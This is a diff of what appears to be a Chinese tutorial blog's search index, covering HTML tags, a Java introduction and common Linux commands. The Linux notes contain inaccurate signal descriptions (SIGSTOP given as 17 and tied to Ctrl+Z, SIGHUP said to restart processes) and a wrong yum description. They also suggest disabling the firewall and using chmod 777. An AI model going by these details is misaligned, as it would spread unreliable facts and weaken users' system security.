+<h3 id="格式化标签"><a href="#格式化标签" class="headerlink" title="格式化标签"></a>格式化标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;br/&gt;         换行</span><br><span class="line"></span><br><span class="line">&lt;center&gt; &lt;/center&gt; 居中</span><br><span class="line"></span><br><span class="line">&lt;span&gt;&lt;/span&gt; 行标签(没有换行) </span><br><span class="line">&lt;kbd&gt;&lt;/kbd&gt;   定义键盘码    </span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;/p&gt;       行标签(自带换行)</span><br><span class="line">&lt;pre&gt;&lt;/pre&gt;   块标签不解析内容</span><br><span class="line"></span><br><span class="line">&lt;code&gt;&lt;/code&gt; 行标签不解析内容   </span><br><span class="line">&lt;var&gt;&lt;/var&gt;   定义变量</span><br><span class="line">&lt;em&gt;帅&lt;/em&gt;</span><br><span class="line">&lt;strong&gt;帅&lt;/strong&gt;</span><br><span class="line">em和strong标签都表示强调，但是它们还是有一定的差别的</span><br><span class="line">第一em标签的样式是斜体，而strong标签的样式是加粗</span><br><span class="line">第二em标签是强调语义的，而strong标签是强调内容的</span><br><span class="line">em标签和strong标签都是行内元素。</span><br></pre></td></tr></table></figure>
+<h3 id="样式标签"><a href="#样式标签" class="headerlink" title="样式标签"></a>样式标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;b&gt;加粗&lt;/b&gt;</span><br><span class="line">&lt;i&gt;倾斜&lt;/i&gt;</span><br><span class="line">&lt;s&gt;删除线&lt;/s&gt; 或 &lt;del&gt;19999&lt;/del&gt;</span><br><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br><span class="line">&lt;font size=2&gt;字体大小&lt;/font&gt;</span><br><span class="line">&lt;font color=&quot;#fa8072&quot;&gt;字体颜色&lt;/font&gt;  </span><br><span class="line">&lt;hr&gt; 水平线 </span><br><span class="line">&lt;blockquote&gt;孔子说的不对&lt;/blockquote&gt;</span><br><span class="line">&lt;q&gt;老子才不对&lt;/q&gt;&lt;br&gt;</span><br><span class="line">q标签和blockquote标签都是引用，不同的是q标签是短引，用而blockquote标签是长引用会换行的。</span><br></pre></td></tr></table></figure>
+<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;      &amp;lt; </span><br><span class="line">&gt;      &amp;gt; </span><br><span class="line">空格   &amp;nbsp; </span><br><span class="line">©     &amp;copy; </span><br><span class="line">®     &amp;reg; </span><br><span class="line">™     &amp;trade;</span><br></pre></td></tr></table></figure>
+
+<h3 id="列表标签和表格标签"><a href="#列表标签和表格标签" class="headerlink" title="列表标签和表格标签"></a>列表标签和表格标签</h3><p>列表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无序列表</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有序列表</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自定义列表 没有圆点和需要</span><br><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;标题&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;..</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure>
+
+<p>表格</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">cellspacing属性是单元格之间的空隙</span><br><span class="line">cellpadding属性是控制整个单元格的大小</span><br><span class="line">border  是边框粗细</span><br><span class="line">align=&quot;center&quot; 居中   left左  right右</span><br><span class="line">style=&quot;text-align: center&quot; 字体居中</span><br><span class="line">其他的就需要使用css来控制了</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   cellspacing=&quot;0&quot; style=&quot;text-align: center&quot;  border=&quot;1px&quot;   &gt;</span><br><span class="line">    &lt;tr &gt;</span><br><span class="line">        &lt;th&gt;标题&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;标题2&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用的布局标签"><a href="#常用的布局标签" class="headerlink" title="常用的布局标签"></a>常用的布局标签</h3><p>header   网页的头部</p>
+<p>main     网页的主体部分（一般只有一个）</p>
+<p>footer   网页的底部</p>
+<p>nav      网页的导航</p>
+<p>aside    和主题相关的内容</p>
+<p>article  文章之类的</p>
+<p>section  独立的块区，上面的标签都不合适，就用这个</p>
+<p>div      块元素</p>
+<h3 id="常用的图片标签"><a href="#常用的图片标签" class="headerlink" title="常用的图片标签"></a>常用的图片标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;图片地址&quot; alt=&quot;图片不显示时候的提示语句&quot; title=&quot;鼠标悬停提示文字&quot; </span><br><span class="line">width=&quot;图片宽px&quot; height=&quot;图片高px&quot;/&gt;</span><br><span class="line">如果宽高不写就默认原图片大小</span><br><span class="line"></span><br><span class="line">img 的其他属性:   </span><br><span class="line"></span><br><span class="line">hspace 和 vspace 属性可以设置图像周围的空间。   类似于设置外边距效果</span><br><span class="line">hspace:左边和右边的文字与图像之间的间距  单位像素(px)</span><br><span class="line">vspace:上面的下面的文字与图像之间的距离  单位像素(px)</span><br><span class="line"></span><br><span class="line">align 属性定义了图像相对于周围元素的水平和垂直对齐方式。</span><br><span class="line">align的值:left(左)、right(右)、top(上) 、middle(中) 和 bottom(下)。</span><br><span class="line">left 和 right 值会把图像周围与其相连的文本转移到相应的边界中；</span><br><span class="line">其余的三个值将图像与其相邻的文字在垂直方向上对齐</span><br></pre></td></tr></table></figure>
+
+<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls提供播放暂停音量控制  必须有</span><br><span class="line">autoplay 自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">preload  视频在页面加载时进行加载，并预备播放。</span><br><span class="line">	如果使用 &quot;autoplay&quot;，则忽略属性。属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">    </span><br><span class="line">(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">loop   媒介文件完成播放后再次开始播放     重复播放</span><br><span class="line">width=”宽度”  height=”高度”</span><br><span class="line">muted   视频的音频应该被静音</span><br><span class="line"></span><br><span class="line">&lt;video width=&quot;320&quot; height=&quot;240&quot; controls &gt;</span><br><span class="line">    &lt;source src=&quot;img/1.mp4&quot; type=&quot;video/mp4&quot;&gt;</span><br><span class="line">    您的浏览器不支持 video 属性。</span><br><span class="line">&lt;/video&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  视频类型</span><br></pre></td></tr></table></figure>
+
+<h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls   向用户显示控件，比如播放按钮。</span><br><span class="line">autoplay   自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">loop     每当音频结束时重新开始播放   </span><br><span class="line">preload  音频在页面加载时进行加载，并预备播放。如果使用 &quot;autoplay&quot;，则忽略该属性。  属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">	(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">&lt;audio controls  autoplay loop&gt;</span><br><span class="line">    &lt;source src=&quot;img/无羁.mp3&quot; type=&quot;audio/mp3&quot; &gt;</span><br><span class="line">    游览器不支持此播放器</span><br><span class="line">&lt;/audio&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  音频类型</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>HTML</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java简介</title>
+    <url>/2023/07/26/Java1/</url>
+    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
+
+<h2 id="什么是Java"><a href="#什么是Java" class="headerlink" title="什么是Java"></a>什么是Java</h2><p>Java是一门面向对象编程语言，不仅吸收了C++语言的各种优点，还摒弃了C++里难以理解的多继承、指针等概念，因此Java语言具有功能强大和简单易用两个特征。Java语言作为静态面向对象编程语言的代表，极好地实现了面向对象理论，允许程序员以优雅的思维方式进行复杂的编程 。</p>
+<h2 id="诞生背景"><a href="#诞生背景" class="headerlink" title="诞生背景"></a>诞生背景</h2><p>任职于Sun公司(Stanford University Network斯坦福网络公司)的詹姆斯·高斯林和麦克·舍林丹等人于1990年代初开发Java语言的雏形，最初被命名为Oak，Oak的目标是作为家用电器等小型系统的编程语言，用于电视机、电话、闹钟、烤面包机等家用电器的控制和通信。由于这些智能化家电的市场需求没有预期的高，Sun公司放弃了该项计划。随着1990年代互联网的发展，Sun公司发现Oak在互联网上应用的前景，于是改造了Oak，于1995年5月以Java的名称正式发布。伴随着互联网的迅猛发展，Java逐渐成为重要的网络编程语言。</p>
+<h2 id="语言特点与应用场景"><a href="#语言特点与应用场景" class="headerlink" title="语言特点与应用场景"></a>语言特点与应用场景</h2><p>Java语言具有简单性、面向对象、分布式、健壮性、安全性、跨平台性、可移植性、多线程与动态性等特点。Java语言可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统等 。Java 快速、安全、可靠。从笔记本电脑到数据中心，从游戏控制台到超级计算机，从手机到互联网，Java 无处不在！</p>
+<h2 id="JVM、JRE和JDK的关系"><a href="#JVM、JRE和JDK的关系" class="headerlink" title="JVM、JRE和JDK的关系"></a>JVM、JRE和JDK的关系</h2><h4 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h4><p>Java Virtual Machine是Java虚拟机，Java程序需要运行在虚拟机上，不同的平台有自己的虚拟机，因此Java语言可以实现跨平台。</p>
+<h4 id="JRE"><a href="#JRE" class="headerlink" title="JRE"></a>JRE</h4><p>Java Runtime Environment包括Java虚拟机和Java程序所需的核心类库等。核心类库主要是java.lang包：包含了运行Java程序必不可少的系统类，如基本数据类型、基本数学函数、字符串处理、线程、异常处理类等，系统缺省加载这个包</p>
+<p>如果想要运行一个开发好的Java程序，计算机中只需要安装JRE即可。</p>
+<h4 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h4><p>Java Development Kit是提供给Java开发人员使用的，其中包含了Java的开发工具，也包括了JRE。所以安装了JDK，就无需再单独安装JRE了。其中的开发工具：编译工具(javac.exe)，打包工具(jar.exe)等</p>
+<p>JVM&amp;JRE&amp;JDK关系图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210430091557268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhbmcxMzU2Mzc1ODEyOA==,size_16,color_FFFFFF,t_70" alt="img"></p>
+<h1 id="Java是编译型还是解释型语言"><a href="#Java是编译型还是解释型语言" class="headerlink" title="Java是编译型还是解释型语言"></a>Java是编译型还是解释型语言</h1><h3 id="1-编译型语言和解释型语言"><a href="#1-编译型语言和解释型语言" class="headerlink" title="1.编译型语言和解释型语言"></a>1.编译型语言和解释型语言</h3><h5 id="编译型语言"><a href="#编译型语言" class="headerlink" title="编译型语言"></a>编译型语言</h5><p><strong>定义</strong>：在程序运行之前，通过编译器将源程序编译成机器码(可运行的二进制代码)，以后执行这个程序时，就不用再进行编译了。</p>
+<p><strong>优点</strong>：编译器一般会有预编译的过程对代码进行优化。因为编译只做一次，运行时不需要编译，所以编译型语言的程序执行效率高，可以脱离语言环境独立运行。</p>
+<p><strong>缺点</strong>：编译之后如果需要修改就需要整个模块重新编译。编译的时候根据对应的运行环境生成机器码，不同的操作系统之间移植就会有问题，需要根据运行的操作系统环境编译不同的可执行文件。</p>
+<p><strong>总结</strong>：执行速度快、效率高；依靠编译器、跨平台性差些。</p>
+<p><strong>代表语言</strong>：C、C++、Pascal、Object-C以及Swift。</p>
+<h6 id="解释型语言"><a href="#解释型语言" class="headerlink" title="解释型语言"></a>解释型语言</h6><p><strong>定义</strong>：解释型语言的源代码不是直接翻译成机器码，而是先翻译成中间代码，再由解释器对中间代码进行解释运行。在运行的时候才将源程序翻译成机器码，翻译一句，然后执行一句，直至结束。</p>
+<p>优点：有良好的平台兼容性，在任何环境中都可以运行，前提是安装了解释器（虚拟机）。灵活，修改代码的时候直接修改就可以，可以快速部署，不用停机维护。</p>
+<p><strong>缺点</strong>：每次运行的时候都要解释一遍，性能上不如编译型语言。</p>
+<p><strong>总结</strong>：执行速度慢、效率低；依靠解释器、跨平台性好。</p>
+<p><strong>代表语言</strong>：JavaScript、Python、Erlang、PHP、Perl、Ruby。</p>
+<h5 id="混合型语言"><a href="#混合型语言" class="headerlink" title="混合型语言"></a>混合型语言</h5><p><strong>定义</strong>：既然编译型和解释型各有缺点就会有人想到把两种类型整合起来，取其精华去其糟粕，就出现了半编译，半解释型语言。</p>
+<p>比如C#，C#在编译的时候不是直接编译成机器码而是中间码，.NET平台提供了中间语言运行库运行中间码，中间语言运行库类似于Java虚拟机。.NET在编译成IL代码后，保存在dll中，首次运行时由JIT在编译成机器码缓存在内存中，下次直接执行。严格来说混合型语言属于解释型语言，C#更接近编译型语言。</p>
+<p><strong>Java即是编译型的，也是解释型语言，总的来说Java更接近解释型语言。</strong></p>
+<p>可以说它是编译型的。因为所有的Java代码都是要编译的，.java不经过编译就什么用都没有。同时围绕JVM的效率问题，会涉及一些如JIT、AOT等优化技术，例如JIT技术，会将热点代码编译成机器码。而AOT技术，是在运行前，通过工具直接将字节码转换为机器码。</p>
+<p>可以说它是解释型的。因为Java代码编译后不能直接运行，它是解释运行在JVM上的，所以它是解释运行的。</p>
+<h3 id="2-动态类型语言和静态类型语言"><a href="#2-动态类型语言和静态类型语言" class="headerlink" title="2.动态类型语言和静态类型语言"></a>2.动态类型语言和静态类型语言</h3><h6 id="动态类型语言"><a href="#动态类型语言" class="headerlink" title="动态类型语言"></a>动态类型语言</h6><p>动态类型语言：在运行期间才去做数据类型检查的语言，说的是数据类型。动态类型语言的数据类型不是在编译阶段决定的，而是把类型绑定延后到了运行阶段。</p>
+<p>代表语言：Python、Ruby、Erlang、JavaScript、Swift、PHP、Perl。</p>
+<h6 id="静态类型语言"><a href="#静态类型语言" class="headerlink" title="静态类型语言"></a>静态类型语言</h6><p>静态类型语言的数据类型是在编译期间（或运行之前）确定的，编写代码的时候要明确确定变量的数据类型。</p>
+<p>代表语言：C、C++、C#、Java、Object-C。</p>
+<h3 id="3-动态语言和静态语言"><a href="#3-动态语言和静态语言" class="headerlink" title="3.动态语言和静态语言"></a>3.动态语言和静态语言</h3><h5 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h5><p>动态类型语言和动态语言是完全不同的两个概念。</p>
+<p>动态语言：说的是运行时改变结构，说的是代码结构。在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</p>
+<p>代表语言：Object-C、C#、JavaScript、PHP、Python、Erlang。</p>
+<h5 id="静态语言"><a href="#静态语言" class="headerlink" title="静态语言"></a>静态语言</h5><p>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++。</p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux</title>
+    <url>/2023/08/09/Linux/</url>
+    <content><![CDATA[<h1 id="Linux操作系统获取方式"><a href="#Linux操作系统获取方式" class="headerlink" title="Linux操作系统获取方式"></a>Linux操作系统获取方式</h1><span id="more"></span>
+
+<p>以centOS为例，获取方法大致分为两种：</p>
+<ul>
+<li><p>从<a href="https://www.centos.org/download/">CentOS官网</a>获取；</p>
+</li>
+<li><p>从镜像网站获取</p>
+<ul>
+<li><p>以</p>
+<p>阿里云镜像</p>
+<p>网站平台为例。</p>
+<ul>
+<li>新版本镜像地址： <a href="https://mirrors.aliyun.com/centos/">https://mirrors.aliyun.com/centos/</a></li>
+<li>旧版本镜像地址： <a href="https://mirrors.aliyun.com/centos-vault/">https://mirrors.aliyun.com/centos-vault/</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="Linux-接口"><a href="#Linux-接口" class="headerlink" title="Linux 接口"></a>Linux 接口</h1><p>Linux 系统是一种金字塔模型的系统，如下所示</p>
+<p><img src="https://img2020.cnblogs.com/blog/1515111/202010/1515111-20201010070233641-1312039505.png" alt="img"></p>
+<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p>pwd 显示工作路径</p>
+<p>shutdown -h now 关闭系统  &#x2F;halt 关闭系统</p>
+<p>shutdown -r now 重启 &#x2F; reboot 重启</p>
+<p>systemctl stop firewalld　　关闭防火墙</p>
+<p>ip addr　　查看ip地址</p>
+<p>1、<strong>cd命令</strong>：这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如：</p>
+<p>cd &#x2F;home 　 进入根目录下面的home目录<br>cd home 　 进入当前目录下的home目录<br>cd ..　　　 返回上一层目录<br>cd ..&#x2F;.. 　　 返回上两级目录<br>cd &#x2F;　　　　　返回跟目录<br>cd - 　　　　返回上次所在的目录 </p>
+<p>2、<strong>ls命令</strong>：这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下：</p>
+<p>ls 　　　查看目录中的文件<br>ls -a　　列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来<br>ls -l 　 显示文件和目录的详细资料 </p>
+<p>ls A*    意味着只列出以 A 为开头的所有文件</p>
+<p>3、<strong>mkdir命令</strong>：创建</p>
+<p>mkdir dir1 创建一个叫做 ‘dir1’ 的目录’<br>mkdir dir1 dir2 同时创建两个目录 </p>
+<p>4、<strong>rm命令</strong>：删除</p>
+<p>rm -f file1　　 删除一个叫做 ‘file1’ 的文件’<br>rmdir dir1 　　删除一个叫做 ‘dir1’ 的目录’ （空目录才能删除）<br>rm -rf dir1 　　删除一个叫做 ‘dir1’ 的目录并同时删除其内容<br>rm -rf dir1 dir2　　 同时删除两个目录及它们的内容 </p>
+<p>rm A*      会移除所有以 A 为开头的文件而不是只删除文件名是 <code>A*</code> 的文件</p>
+<p>5、<strong>mv命令</strong>：该命令用于移动文件、目录或更名，move之意，它的常用参数如下：-f 如果目标文件已经存在，不会询问而直接覆盖</p>
+<p>mv file1 file2  把文件file1重命名为file2 </p>
+<p>mv file1 file2 dir  把文件file1、file2移动到目录dir中</p>
+<p>6、<strong>cp命令</strong>：该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下， 它的常用参数如下：</p>
+<p>cp -a file1 file2 连同文件的所有特性把文件file1复制成文件file2<br>cp dir&#x2F;* . 复制一个目录下的所有文件到当前工作目录<br>cp -a &#x2F;tmp&#x2F;dir1 . 复制一个目录到当前工作目录<br>cp -a dir1 dir2 复制一个目录 </p>
+<p>7、<strong>find命令</strong>：find是一个基于查找的功能非常强大的命令</p>
+<p>find &#x2F; -name file1 从 ‘&#x2F;‘ 开始进入根文件系统搜索文件和目录<br>find &#x2F; -user user1 搜索属于用户 ‘user1’ 的文件和目录<br>find &#x2F;home&#x2F;user1 -name *.bin 在目录 ‘&#x2F; home&#x2F;user1’ 中搜索带有’.bin’ 结尾的文件<br>find &#x2F;usr&#x2F;bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件<br>find &#x2F;usr&#x2F;bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件 </p>
+<p>8、<strong>ps命令</strong>：该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下：</p>
+<p>-A ：所有的进程均显示出来<br>-a ：不与terminal有关的所有进程<br>-u ：有效用户的相关进程<br>-x ：一般与a参数一起使用，可列出较完整的信息<br>-l ：较长，较详细地将PID的信息列出<br>其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下：</p>
+<p>ps aux  查看系统所有的进程数据<br>ps ax  查看不与terminal有关的所有进程<br>ps -lA  查看系统所有的进程数据<br>ps axjf  查看连同一部分进程树状态</p>
+<p>9、<strong>kill命令</strong>：该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下：</p>
+<p>kill -signal PID<br>signal的常用参数如下：注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。</p>
+<p>1：SIGHUP，启动被终止的进程<br>2：SIGINT，相当于输入ctrl+c，中断一个程序的进行<br>9：SIGKILL，强制中断一个进程的进行<br>15：SIGTERM，以正常的结束进程方式来终止进程<br>17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行<br>例如：</p>
+<p># 以正常的结束进程方式来终于第一个后台工作，可用jobs命令查看后台中的第一个工作进程<br>kill -SIGTERM %1<br># 重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进行筛选获得<br>kill -SIGHUP PID </p>
+<p> 10、<strong>tar命令</strong>：该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下：</p>
+<ol>
+<li>压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称 </li>
+<li>查询：tar -jtv -f filename.tar.bz2 </li>
+<li>解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录</li>
+</ol>
+<p>11、chmod命令：该命令用于改变文件的权限，一般的用法如下：</p>
+<p>chmod -R 777   chmod -R 777 意思就是将当前目录及目录下所有文件都给予777权限（所有权限）</p>
+<p><strong>查看文件内容</strong><br>cat file1 从第一个字节开始正向查看文件的内容<br>tac file1 从最后一行开始反向查看一个文件的内容<br>more file1 查看一个长文件的内容<br>less file1 类似于 ‘more’ 命令，但是它允许在文件中和正向操作一样的反向操作<br>head -2 file1 查看一个文件的前两行<br>tail -2 file1 查看一个文件的最后两行<br>tail -f &#x2F;var&#x2F;log&#x2F;messages 实时查看被添加到一个文件中的内容 </p>
+<p><strong>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</strong><br>yum install package_name 下载并安装一个rpm包<br>yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系<br>yum update package_name.rpm 更新当前系统中所有安装的rpm包<br>yum update package_name 更新一个rpm包<br>yum remove package_name 删除一个rpm包<br>yum list 列出当前系统中安装的所有包<br>yum search package_name 在rpm仓库中搜寻软件包<br>yum clean packages 清理rpm缓存删除下载的包<br>yum clean headers 删除所有头文件<br>yum clean all 删除所有缓存的包和头文件 </p>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Docker命令</title>
     <url>/2023/07/31/Docker%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h1 id="Docker的常用命令"><a href="#Docker的常用命令" class="headerlink" title="Docker的常用命令"></a>Docker的常用命令</h1><span id="more"></span>
@@ -635,126 +823,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HTML</title>
-    <url>/2023/08/08/HTML/</url>
-    <content><![CDATA[<h1 id="html基本元素标签"><a href="#html基本元素标签" class="headerlink" title="html基本元素标签"></a>html基本元素标签</h1><span id="more"></span>
-
-<ol>
-<li><p><code>&lt;html&gt;</code>：HTML网页的根标签，表示一个HTML文档的开始和结束</p>
-</li>
-<li><p><code>&lt;head&gt;</code>：HTML文档的头部，用于描述文档的元数据、样式等信息</p>
-</li>
-<li><p><code>&lt;title&gt;</code>：HTML文档的标题标签，用于在浏览器标签栏中显示文档的标题</p>
-</li>
-<li><p><code>&lt;body&gt;</code>：HTML文档的主体部分，包含了网页的实际内容</p>
-</li>
-<li><p><code>&lt;h1&gt;</code>～<code>&lt;h6&gt;</code>：标题标签，表示文本的标题，从大到小分别对应不同级别的标题</p>
-</li>
-<li><p><code>&lt;p&gt;</code>：段落标签，用于分隔文本内容</p>
-</li>
-<li><p><code>&lt;a&gt;</code>：超链接标签，用于添加链接到其他文档、页面、图片等</p>
-</li>
-<li><p><code>&lt;img&gt;</code>：图片标签，用于在网页中嵌入图片</p>
-</li>
-<li><p><code>&lt;ul&gt;</code>：无序列表标签，用于创建无序列表</p>
-</li>
-<li><p><code>&lt;ol&gt;</code>：有序列表标签，用于创建有序列表</p>
-</li>
-<li><p><code>&lt;li&gt;</code>：列表项标签，用于创建列表项</p>
-</li>
-<li><p><code>&lt;table&gt;</code>：表格标签，用于创建表格</p>
-</li>
-<li><p><code>&lt;tr&gt;</code>：表格的行标签，表示一行</p>
-</li>
-<li><p><code>&lt;td&gt;</code>：单元格标签，用于表示表格中的单元格</p>
-</li>
-<li><p><code>&lt;form&gt;</code>：表单标签，用于创建表单</p>
-</li>
-<li><p><code>&lt;input&gt;</code>：输入框标签，用于输入文本、表单等</p>
-</li>
-<li><p><code>&lt;select&gt;</code>：下拉列表标签，用于创建下拉选择框</p>
-</li>
-<li><p><code>&lt;textarea&gt;</code>：文本域标签，允许用户输入多行文本</p>
-</li>
-</ol>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--文档声明，声明当前网页的版本--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--html的根标签（元素），网页中的所有内容都要写在根元素的里边--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--head是网页头部，head中的内容不会在网页中直接出现，主要用来帮助浏览器或搜索引擎来解析网页--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--meta标签用来设置网页的元数据，这里meta用来设置网页的字符集，避免乱码问题--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--UTF-8（万国码）--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>显示在浏览器的标题栏<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--body是html的子元素，表示网页的主体，网页中的所有可见的内容都应写在body里面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      这里是主体</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="格式化标签"><a href="#格式化标签" class="headerlink" title="格式化标签"></a>格式化标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;br/&gt;         换行</span><br><span class="line"></span><br><span class="line">&lt;center&gt; &lt;/center&gt; 居中</span><br><span class="line"></span><br><span class="line">&lt;span&gt;&lt;/span&gt; 行标签(没有换行) </span><br><span class="line">&lt;kbd&gt;&lt;/kbd&gt;   定义键盘码    </span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;/p&gt;       行标签(自带换行)</span><br><span class="line">&lt;pre&gt;&lt;/pre&gt;   块标签不解析内容</span><br><span class="line"></span><br><span class="line">&lt;code&gt;&lt;/code&gt; 行标签不解析内容   </span><br><span class="line">&lt;var&gt;&lt;/var&gt;   定义变量</span><br><span class="line">&lt;em&gt;帅&lt;/em&gt;</span><br><span class="line">&lt;strong&gt;帅&lt;/strong&gt;</span><br><span class="line">em和strong标签都表示强调，但是它们还是有一定的差别的</span><br><span class="line">第一em标签的样式是斜体，而strong标签的样式是加粗</span><br><span class="line">第二em标签是强调语义的，而strong标签是强调内容的</span><br><span class="line">em标签和strong标签都是行内元素。</span><br></pre></td></tr></table></figure>
